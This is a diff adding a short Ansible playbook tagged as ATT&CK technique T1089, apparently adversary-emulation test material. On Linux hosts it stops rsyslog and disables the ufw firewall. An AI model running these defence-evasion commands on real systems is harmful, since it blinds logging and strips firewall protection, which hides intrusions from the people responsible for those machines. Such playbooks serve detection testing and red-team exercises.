@@ -1,0 +1,8 @@
+# attack_technique: T1089
+- name: Disabling Security Tools
+  hosts: linux
+  tasks:
+          - name: disable syslog
+            shell: service rsyslog stop
+          - name: disable ufw
+            shell: ufw disable
